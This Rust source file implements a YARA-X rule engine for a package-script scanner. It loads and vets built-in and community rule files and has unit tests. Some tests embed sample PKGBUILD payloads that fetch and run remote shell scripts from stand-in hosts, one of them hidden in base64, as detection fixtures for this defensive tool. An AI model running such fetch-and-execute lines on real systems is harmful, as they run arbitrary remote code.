//! YARA-X rule engine (AXIS extension).
//!
//! Rules are **compiled once** when the [`crate::Scanner`] is built and the
//! compiled set is shared by every scan. Two sources feed it:
//!
//! 1. the built-in rules in `yara_rules/builtin.yar`, embedded in the binary;
//! 2. extra `*.yar` / `*.yara` files from the same `rules.d` directories the
//!    TOML community rules use, plus the configured `rules_path`.
//!
//! External files are vetted with the same policy as `rules.d` TOML files:
//! a file that does not compile, has a rule without a valid `severity`, is a
//! symlink, is oversized, or re-uses an id that is already taken is skipped with
//! a warning on stderr. The first definition of an id always wins, so an
//! external rule can add detections but never replace or lower a built-in one.

use crate::error::{Result, ScanError};
use crate::normalizer::ScriptNormalizer;
use crate::rules::{reserved_rule_ids, warn_rule};
use crate::types::{Category, Finding, Location, Severity};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use yara_x::{Compiler, MetaValue, Rules, Scanner};

/// Built-in rules, embedded at compile time.
const BUILTIN_RULES: &str = include_str!("yara_rules/builtin.yar");

/// Upper bound for one external rule file. A user-writable rules directory must
/// not be able to make the scanner read or compile an unbounded file.
const MAX_RULE_FILE_BYTES: u64 = 256 * 1024;

const DEFAULT_RECOMMENDATION: &str =
    "Inspect script for unauthorized network command execution or obfuscated base64 payloads.";

#[derive(Debug, Clone, PartialEq)]
pub struct YaraFinding {
    pub rule_name: String,
    pub severity: String,
    pub description: String,
    /// Where the rule came from: `"builtin"` or the path of the `.yar` file.
    pub source: String,
    /// Optional `recommendation` meta of the rule.
    pub recommendation: Option<String>,
    /// Optional `cwe` meta of the rule (e.g. `"CWE-78"`).
    pub cwe: Option<String>,
}

/// A compiled YARA-X rule set. Build it once, scan with it many times.
pub struct YaraAuditEngine {
    rules: Rules,
    /// rule identifier -> origin ("builtin" or file path)
    origin: HashMap<String, String>,
}

impl YaraAuditEngine {
    /// Engine with the built-in rules only (nothing is read from disk).
    pub fn builtin() -> Result<Self> {
        Self::load(&[], None)
    }

    /// Built-in rules plus every valid `*.yar` / `*.yara` file found in
    /// `dirs` (in order) and then in `explicit_dir` (the config `rules_path`).
    ///
    /// Missing directories are ignored. Invalid external files are skipped with
    /// a warning; invalid *built-in* rules are a hard error.
    pub fn load(dirs: &[PathBuf], explicit_dir: Option<&Path>) -> Result<Self> {
        // Ids an external rule may never take: built-in TOML rules and analyzer
        // codes, then (below) the built-in YARA rules and earlier accepted files.
        let mut reserved = reserved_rule_ids();
        let mut origin: HashMap<String, String> = HashMap::new();

        let builtin_ids = vet_source(BUILTIN_RULES)
            .map_err(|e| ScanError::Rule(format!("built-in YARA rules are invalid: {e}")))?;

        let mut compiler = Compiler::new();
        compiler.new_namespace("builtin");
        compiler
            .add_source(BUILTIN_RULES)
            .map_err(|e| ScanError::Rule(format!("failed to compile built-in YARA rules: {e}")))?;
        for id in builtin_ids {
            reserved.insert(id.clone());
            origin.insert(id, "builtin".to_string());
        }

        let mut all_dirs: Vec<PathBuf> = Vec::new();
        for d in dirs.iter().map(|d| d.as_path()).chain(explicit_dir) {
            if !all_dirs.iter().any(|seen| seen == d) {
                all_dirs.push(d.to_path_buf());
            }
        }

        let mut namespace_counter = 0usize;
        for dir in &all_dirs {
            for path in yara_files(dir) {
                let shown = path.display().to_string();
                let src = match read_rule_file(&path) {
                    Ok(s) => s,
                    Err(e) => {
                        warn_rule(&format!("skipping YARA rule file {shown}: {e}"));
                        continue;
                    }
                };
                let ids = match vet_source(&src) {
                    Ok(ids) => ids,
                    Err(e) => {
                        warn_rule(&format!("skipping YARA rule file {shown}: {e}"));
                        continue;
                    }
                };
                if let Some(dup) = ids.iter().find(|id| reserved.contains(*id)) {
                    warn_rule(&format!(
                        "skipping YARA rule file {shown}: rule id `{dup}` is already taken \
                         (a rules.d file can add detections but never replace one)"
                    ));
                    continue;
                }

                namespace_counter += 1;
                compiler.new_namespace(&format!("external{namespace_counter}"));
                if let Err(e) = compiler.add_source(src.as_str()) {
                    // Vetting compiled this exact text, so this is not expected.
                    warn_rule(&format!("skipping YARA rule file {shown}: {e}"));
                    continue;
                }
                for id in ids {
                    reserved.insert(id.clone());
                    origin.insert(id, shown.clone());
                }
            }
        }

        Ok(Self {
            rules: compiler.build(),
            origin,
        })
    }

    /// Number of rules in the compiled set (built-in + external).
    pub fn rule_count(&self) -> usize {
        self.origin.len()
    }

    pub fn scan(&self, raw_content: &str) -> std::result::Result<Vec<YaraFinding>, String> {
        let normalized_buf = ScriptNormalizer::normalize(raw_content);

        let mut scanner = Scanner::new(&self.rules);
        let scan_results = scanner
            .scan(normalized_buf.normalized.as_bytes())
            .map_err(|e| format!("YARA scan execution failed: {e}"))?;

        let mut findings = Vec::new();
        for matching_rule in scan_results.matching_rules() {
            let rule_name = matching_rule.identifier().to_string();
            findings.push(YaraFinding {
                severity: meta_string(&matching_rule, "severity")
                    .unwrap_or_else(|| "Medium".to_string()),
                description: meta_string(&matching_rule, "description")
                    .unwrap_or_else(|| "Suspicious pattern matched".to_string()),
                recommendation: meta_string(&matching_rule, "recommendation"),
                cwe: meta_string(&matching_rule, "cwe"),
                source: self
                    .origin
                    .get(&rule_name)
                    .cloned()
                    .unwrap_or_else(|| "unknown".to_string()),
                rule_name,
            });
        }

        Ok(findings)
    }

    pub fn scan_as_findings(&self, raw_content: &str, target_path: &str) -> Vec<Finding> {
        let mut results = Vec::new();
        if let Ok(yara_findings) = self.scan(raw_content) {
            for yf in yara_findings {
                // Vetting guarantees a valid severity; if that ever regressed,
                // err on the loud side rather than hiding a match as Low.
                let sev = parse_severity(&yf.severity).unwrap_or(Severity::High);

                let finding = Finding {
                    id: yf.rule_name.clone(),
                    severity: sev,
                    category: Category::CommandInjection,
                    title: format!("YARA-X Match: {}", yf.rule_name),
                    description: yf.description,
                    location: Location {
                        file: PathBuf::from(target_path),
                        line: None,
                        column: None,
                        snippet: None,
                    },
                    recommendation: yf
                        .recommendation
                        .unwrap_or_else(|| DEFAULT_RECOMMENDATION.to_string()),
                    cwe_id: Some(yf.cwe.unwrap_or_else(|| "CWE-78".to_string())),
                    metadata: serde_json::json!({ "engine": "yara-x", "source": yf.source }),
                };

                results.push(finding);
            }
        }
        results
    }
}

/// `*.yar` / `*.yara` files directly inside `dir`, sorted by path so load order
/// (and therefore which of two colliding ids wins) is deterministic. A missing
/// or unreadable directory simply yields nothing.
fn yara_files(dir: &Path) -> Vec<PathBuf> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut files: Vec<PathBuf> = entries
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .filter(|p| {
            p.extension()
                .and_then(|e| e.to_str())
                .map(|e| e.eq_ignore_ascii_case("yar") || e.eq_ignore_ascii_case("yara"))
                .unwrap_or(false)
        })
        .collect();
    files.sort();
    files
}

/// Read one external rule file: regular file only (no symlinks), bounded size,
/// valid UTF-8.
fn read_rule_file(path: &Path) -> std::result::Result<String, String> {
    let meta = std::fs::symlink_metadata(path).map_err(|e| format!("cannot stat: {e}"))?;
    if meta.file_type().is_symlink() || !meta.is_file() {
        return Err("not a regular file (symlinks are not followed)".to_string());
    }
    if meta.len() > MAX_RULE_FILE_BYTES {
        return Err(format!(
            "larger than the {} byte limit for a rule file",
            MAX_RULE_FILE_BYTES
        ));
    }
    std::fs::read_to_string(path).map_err(|e| format!("cannot read as UTF-8 text: {e}"))
}

/// Compile `src` on its own and check it follows the rule-file contract.
/// Returns the rule identifiers it defines.
fn vet_source(src: &str) -> std::result::Result<Vec<String>, String> {
    let mut compiler = Compiler::new();
    compiler
        .add_source(src)
        .map_err(|e| format!("does not compile: {e}"))?;
    let rules = compiler.build();

    let mut ids = Vec::new();
    for rule in rules.iter() {
        let ok = meta_string(&rule, "severity")
            .and_then(|s| parse_severity(&s))
            .is_some();
        if !ok {
            return Err(format!(
                "rule `{}` needs a `severity` meta of critical|high|medium|low|info",
                rule.identifier()
            ));
        }
        ids.push(rule.identifier().to_string());
    }
    if ids.is_empty() {
        return Err("defines no rules".to_string());
    }
    Ok(ids)
}

fn meta_string(rule: &yara_x::Rule, key: &str) -> Option<String> {
    rule.metadata().find_map(|(name, value)| match value {
        MetaValue::String(s) if name == key => Some(s.to_string()),
        _ => None,
    })
}

fn parse_severity(s: &str) -> Option<Severity> {
    match s.trim().to_ascii_lowercase().as_str() {
        "critical" => Some(Severity::Critical),
        "high" => Some(Severity::High),
        "medium" => Some(Severity::Medium),
        "low" => Some(Severity::Low),
        "info" => Some(Severity::Info),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicUsize, Ordering};

    static COUNTER: AtomicUsize = AtomicUsize::new(0);

    fn temp_dir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "yipyip-yara-{tag}-{}-{}",
            std::process::id(),
            COUNTER.fetch_add(1, Ordering::SeqCst)
        ));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    const MARKER_RULE: &str = r#"
rule Community_Test_Marker {
    meta:
        severity = "medium"
        description = "test marker"
        recommendation = "remove the marker"
        cwe = "CWE-506"
    strings:
        $a = "yipyip-test-marker"
    condition:
        $a
}
"#;

    #[test]
    fn engine_is_send_and_sync() {
        fn check<T: Send + Sync>() {}
        check::<YaraAuditEngine>();
    }

    #[test]
    fn builtin_rules_load_with_valid_severity() {
        let engine = YaraAuditEngine::builtin().expect("built-in rules must compile");
        assert_eq!(engine.rule_count(), 2);
    }

    #[test]
    fn yara_detects_normalized_process_sub() {
        let engine = YaraAuditEngine::builtin().unwrap();
        let payload = r#"
build() {
    bash < <(curl -fsSL https://evil.example/script.sh)
}
"#;
        let findings = engine.scan(payload).expect("scan should succeed");
        assert!(!findings.is_empty(), "Harus ada finding YARA");
        assert_eq!(findings[0].rule_name, "AUR_Malicious_Process_Substitution");
        assert_eq!(findings[0].severity, "Critical");
        assert_eq!(findings[0].source, "builtin");
    }

    #[test]
    fn yara_detects_decoded_base64_payload() {
        let engine = YaraAuditEngine::builtin().unwrap();
        let payload = r#"
build() {
    echo "Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9zY3JpcHQuc2ggfCBiYXNo" | base64 -d | sh
}
"#;
        let findings = engine.scan(payload).expect("scan should succeed");
        assert!(!findings.is_empty(), "Harus mendeteksi payload hasil decode");
        assert!(findings
            .iter()
            .any(|f| f.rule_name == "AUR_Decoded_Payload_Network_Execution"));
    }

    #[test]
    fn external_rule_is_loaded_and_reports_its_source() {
        let dir = temp_dir("ok");
        std::fs::write(dir.join("marker.yar"), MARKER_RULE).unwrap();
        let engine = YaraAuditEngine::load(&[dir.clone()], None).unwrap();
        assert_eq!(engine.rule_count(), 3);

        let findings = engine.scan_as_findings("x yipyip-test-marker y", "PKGBUILD");
        assert_eq!(findings.len(), 1);
        let f = &findings[0];
        assert_eq!(f.id, "Community_Test_Marker");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.recommendation, "remove the marker");
        assert_eq!(f.cwe_id.as_deref(), Some("CWE-506"));
        let src = f.metadata["source"].as_str().unwrap();
        assert!(src.ends_with("marker.yar"), "source was {src}");
        std::fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn explicit_rules_path_is_loaded_too() {
        let dir = temp_dir("explicit");
        std::fs::write(dir.join("marker.yara"), MARKER_RULE).unwrap();
        let engine = YaraAuditEngine::load(&[], Some(dir.as_path())).unwrap();
        assert_eq!(engine.scan("yipyip-test-marker").unwrap().len(), 1);
        std::fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn external_rule_cannot_replace_a_builtin() {
        let dir = temp_dir("collide");
        // Same id as a built-in, always-true, low severity: if this were
        // accepted it would also shadow/dilute the built-in.
        std::fs::write(
            dir.join("evil.yar"),
            r#"rule AUR_Malicious_Process_Substitution {
                meta: severity = "info"
                condition: true
            }"#,
        )
        .unwrap();
        let engine = YaraAuditEngine::load(&[dir.clone()], None).unwrap();
        assert_eq!(engine.rule_count(), 2, "colliding file must be rejected");
        assert!(engine.scan("echo hello").unwrap().is_empty());
        let hit = engine.scan("bash < <(curl -s https://x.example/a.sh)").unwrap();
        assert_eq!(hit[0].severity, "Critical");
        std::fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn first_definition_of_an_id_wins_across_files() {
        let dir = temp_dir("dupe");
        std::fs::write(dir.join("a.yar"), MARKER_RULE).unwrap();
        std::fs::write(dir.join("b.yar"), MARKER_RULE.replace("medium", "critical")).unwrap();
        let engine = YaraAuditEngine::load(&[dir.clone()], None).unwrap();
        let hits = engine.scan("yipyip-test-marker").unwrap();
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, "medium");
        std::fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn bad_files_are_skipped_without_blocking_good_ones() {
        let dir = temp_dir("bad");
        std::fs::write(dir.join("a_broken.yar"), "rule oops { condition: ").unwrap();
        std::fs::write(
            dir.join("b_nosev.yar"),
            r#"rule No_Severity { strings: $a = "nosev-marker" condition: $a }"#,
        )
        .unwrap();
        std::fs::write(
            dir.join("c_badsev.yar"),
            r#"rule Bad_Severity { meta: severity = "urgent" strings: $a = "badsev-marker" condition: $a }"#,
        )
        .unwrap();
        std::fs::write(dir.join("d_good.yar"), MARKER_RULE).unwrap();
        std::fs::write(dir.join("notes.txt"), MARKER_RULE.replace("Community_Test_Marker", "From_Txt")).unwrap();

        let engine = YaraAuditEngine::load(&[dir.clone()], None).unwrap();
        assert_eq!(engine.rule_count(), 3, "only the good file is added");
        assert!(engine.scan("nosev-marker badsev-marker").unwrap().is_empty());
        assert_eq!(engine.scan("yipyip-test-marker").unwrap().len(), 1);
        std::fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn oversized_rule_file_is_skipped() {
        let dir = temp_dir("big");
        let mut big = MARKER_RULE.to_string();
        big.push_str(&format!("\n// {}\n", "x".repeat(MAX_RULE_FILE_BYTES as usize)));
        std::fs::write(dir.join("big.yar"), big).unwrap();
        let engine = YaraAuditEngine::load(&[dir.clone()], None).unwrap();
        assert_eq!(engine.rule_count(), 2);
        std::fs::remove_dir_all(dir).ok();
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_rule_file_is_not_followed() {
        let real = temp_dir("real");
        let rules_d = temp_dir("link");
        std::fs::write(real.join("marker.yar"), MARKER_RULE).unwrap();
        std::os::unix::fs::symlink(real.join("marker.yar"), rules_d.join("link.yar")).unwrap();
        let engine = YaraAuditEngine::load(&[rules_d.clone()], None).unwrap();
        assert_eq!(engine.rule_count(), 2);
        std::fs::remove_dir_all(real).ok();
        std::fs::remove_dir_all(rules_d).ok();
    }

    #[test]
    fn missing_directory_is_ignored_and_duplicates_are_deduped() {
        let dir = temp_dir("dedupe");
        std::fs::write(dir.join("marker.yar"), MARKER_RULE).unwrap();
        let gone = dir.join("does-not-exist");
        let engine =
            YaraAuditEngine::load(&[gone, dir.clone(), dir.clone()], Some(dir.as_path())).unwrap();
        assert_eq!(engine.rule_count(), 3);
        std::fs::remove_dir_all(dir).ok();
    }
}
